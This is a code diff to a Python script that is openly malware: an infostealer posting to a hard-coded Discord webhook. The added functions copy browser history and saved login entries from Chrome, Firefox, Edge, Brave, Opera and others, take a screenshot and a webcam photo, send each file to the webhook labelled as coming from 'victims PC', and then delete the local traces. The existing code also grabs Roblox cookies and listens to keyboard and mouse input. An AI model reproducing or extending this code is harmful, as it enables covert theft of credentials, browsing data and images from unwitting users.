@@ -16,6 +16,10 @@ import time
 from pynput import mouse, keyboard
 from pynput.keyboard import Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
+import cv2
+import pyautogui
+import sqlite3
+import tempfile
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1439340174340390913/ma4jamCgF3dVLl8RG5pQjvN1DB7Ns45bfPk87-MEJwHwoRnmToA46trbe9ep-yCWBE-m"
 
@@ -76,6 +80,7 @@ def getheaders(token=None):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
 
+    
     if sys.platform == "win32" and platform.release() == "10.0.22000":
         headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
 
@@ -141,6 +146,187 @@ def retrieve_roblox_cookies():
     except Exception as e:
         return str(e)
 
+def send_to_discord(message):
+    payload = {"content": message}
+    response = requests.post(WEBHOOK_URL, json=payload)
+    if response.status_code == 204:
+        print("")
+    else:
+        print(f"Failed: {response.status_code} {response.text}")
+
+def get_history_path(browser):
+    if browser == "Chrome":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
+    elif browser == "Firefox":
+        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
+        if not os.path.exists(profiles_path):
+            return None
+        profile_folders = next(os.walk(profiles_path))[1]
+        if not profile_folders:
+            return None
+        profile_folder = profile_folders[0]  
+        return os.path.join(profiles_path, profile_folder, "places.sqlite")
+    elif browser == "Brave":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
+    elif browser == "Edge":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
+    elif browser == "Opera":
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
+    elif browser == "Opera GX":
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "History")
+    else:
+        return None
+
+def is_browser_installed(browser):
+    path = get_history_path(browser)
+    return path and os.path.exists(path)
+
+def get_browser_history(browser, limit=200):
+    original_path = get_history_path(browser)
+    if not original_path or not os.path.exists(original_path):
+        return
+
+    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")
+
+    try:
+        shutil.copy2(original_path, temp_path)
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+
+        if browser == "Firefox":
+            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT ?", (limit,))
+        else:
+            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
+        rows = cursor.fetchall()
+
+        history_lines = []
+        for url, title, timestamp in rows:
+            if timestamp is not None:
+                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
+                history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
+            else:
+                history_lines.append(f"Unknown time - {title} ({url})")
+
+        conn.close()
+        os.remove(temp_path)
+        return "\n".join(history_lines)
+
+    except Exception as e:
+        return f"Error accessing {browser} history: {e}"
+
+def save_to_file(browser, history):
+    filename = f"{browser}_history.txt"
+    with open(filename, 'w', encoding='utf-8') as file:
+        file.write(history)
+    return filename
+
+def send_file_to_discord(file_path, message="Screenshot from victims PC"):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        data = {'content': message}
+        response = requests.post(WEBHOOK_URL, files=files, data=data)
+    if response.status_code == 204:
+        pass
+    else:
+        pass
+
+def get_login_path(browser):
+    if browser == "Chrome":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
+    elif browser == "Firefox":
+        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
+        if not os.path.exists(profiles_path):
+            return None
+        profile_folders = next(os.walk(profiles_path))[1]
+        if not profile_folders:
+            return None
+        profile_folder = profile_folders[0]  
+        return os.path.join(profiles_path, profile_folder, "logins.json")
+    elif browser == "Brave":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
+    elif browser == "Edge":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
+    elif browser == "Zen":
+        return os.path.join(os.getenv("LOCALAPPDATA"), "Zen", "User Data", "Default", "Login Data")
+    elif browser == "Opera":
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
+    elif browser == "Opera GX":
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")
+    else:
+        return None
+
+def is_browser_installed(browser):
+    path = get_login_path(browser)
+    return path and os.path.exists(path)
+
+def get_browser_logins(browser, limit=100):
+    original_path = get_login_path(browser)
+    if not original_path or not os.path.exists(original_path):
+        return
+
+    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_login_copy")
+
+    try:
+        shutil.copy2(original_path, temp_path)
+        if browser == "Firefox":
+            with open(temp_path, 'r', encoding='utf-8') as file:
+                data = json.load(file)
+                logins = data.get("logins", [])
+                login_lines = []
+                for login in logins[:limit]:
+                    url = login.get("hostname")
+                    email = login.get("encryptedUsername")
+                    if url and email:
+                        login_lines.append(f"URL: {url}, Email: {email}")
+                return "\n".join(login_lines)
+        else:
+            conn = sqlite3.connect(temp_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value FROM logins LIMIT ?", (limit,))
+            rows = cursor.fetchall()
+            login_lines = []
+            for url, email in rows:
+                if url and email:
+                    login_lines.append(f"URL: {url}, Email: {email}")
+            conn.close()
+            os.remove(temp_path)
+            return "\n".join(login_lines)
+
+    except Exception:
+        return None
+
+def save_to_file(browser, logins):
+    
+    desktop_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
+    if not os.path.exists(desktop_path):
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    filename = os.path.join(desktop_path, f"{browser}_logins.txt")
+    with open(filename, 'w', encoding='utf-8') as file:
+        file.write(logins)
+    return filename
+
+def delete_file(file_path):
+    if os.path.exists(file_path):
+        os.remove(file_path)
+
+def capture_image():
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        return None
+
+    ret, frame = cap.read()
+    if not ret:
+        cap.release()
+        return None
+
+    cap.release()
+    return frame
+
+def take_screenshot(filename='screenshot.png'):
+    screenshot = pyautogui.screenshot()
+    screenshot.save(filename)
+    return filename
+
 def main():
     checked = []
 
@@ -189,15 +375,64 @@ def main():
                 print(f"ERROR: {e}")
                 continue
 
+    
+    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Zen", "Opera", "Opera GX"]
+    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
+
+    if not installed_browsers:
+        return
+
+    created_files = []
+
+    for browser in installed_browsers:
+        history = get_browser_history(browser, limit=200)
+        if history:
+            file_path = save_to_file(browser, history)
+            created_files.append(file_path)
+            send_file_to_discord(file_path, message="Browser History")
+        else:
+            pass
+
+    
+    for browser in installed_browsers:
+        logins = get_browser_logins(browser, limit=200)
+        if logins:
+            file_path = save_to_file(browser, logins)
+            created_files.append(file_path)
+            send_file_to_discord(file_path, message="Browser Logins")
+        else:
+            pass
+
+    
+    screenshot_paths = []
+    for i in range(1):
+        screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
+        screenshot_paths.append(screenshot_path)
+        send_file_to_discord(screenshot_path, message="Screenshot from victims PC")
+        time.sleep(2)
+
+    for path in screenshot_paths:
+        delete_file(path)
+
+    
+    image = capture_image()
+    if image is not None:
+        image_path = 'captured_image.jpg'
+        cv2.imwrite(image_path, image)
+        send_file_to_discord(image_path, message="Camera Image")
+        created_files.append(image_path)
+
+    
+    for file_path in created_files:
+        delete_file(file_path)
+
+    
+    roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
+    delete_file(roblox_cookies_path)
+
 if __name__ == "__main__":
     main()
     schedule_shutdown()
-
-import ctypes
-import time
-from pynput import mouse, keyboard
-from pynput.keyboard import Listener as KeyboardListener
-from pynput.mouse import Listener as MouseListener
 
 PUL = ctypes.POINTER(ctypes.c_ulong)
 
